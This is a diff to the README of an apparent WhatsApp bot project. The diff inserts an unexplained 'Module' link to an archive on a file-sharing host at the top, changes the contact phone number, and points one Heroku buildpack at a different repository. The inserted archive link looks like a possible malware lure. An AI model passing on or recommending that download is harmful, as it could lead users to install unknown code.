@@ -1,3 +1,4 @@
+Module : https://www.mediafire.com/file/lr792u729liv5qp/archive-2022-07-09T062602Z.tar.gz/file
 <p align="center">
     <img src="https://telegra.ph/file/eaabc97cb81180be2c9a6.jpg" width="100%" style="margin-left: auto;margin-right: auto;display: block;">
 </p>
@@ -14,7 +15,7 @@
 
 ---------
 ## ```Connect With Me 📞``` <img src="https://github.com/siegrin/siegrin/blob/main/Assets/Handshake.gif" height="32px">
-  <a href="https://wa.me/6282142185506">
+  <a href="https://wa.me/6285608625102">
     <img align="left" alt="SIEGRIN | Whastapp" width="26px" src="https://github.com/siegrin/siegrin/blob/main/Assets/Whatsapp.svg" />
   </a> &nbsp;&nbsp;
   <a href="https://www.instagram.com/leonvx._">
@@ -71,7 +72,7 @@
 | BuildPack | LINK |
 |--------|--------|
 | **FFMPEG** |[here](https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest) |
-| **IMAGEMAGICK** | [here](https://github.com/mcollina/heroku-buildpack-imagemagick) |
+| **IMAGEMAGICK** | [here](https://github.com/rocketmobile/heroku-buildpack-imagemagick.git) |
 
 ## TERMUX USER
 ```bash
@@ -253,4 +254,4 @@ conn.sendButton(m.chat, 'Hello world!', '@BochilGaming', 'https://github.com/Boc
 * [`Rasel Comel`](https://github.com/raselcomel)
 * [`Rominaru`](https://github.com/rominaru)
 * [`KannaChan`](https://github.com/kannachann)
-* [`Fahri Adison`](https://github.com/FahriAdison) 
+* [`Fahri Adison`](https://github.com/FahriAdison)
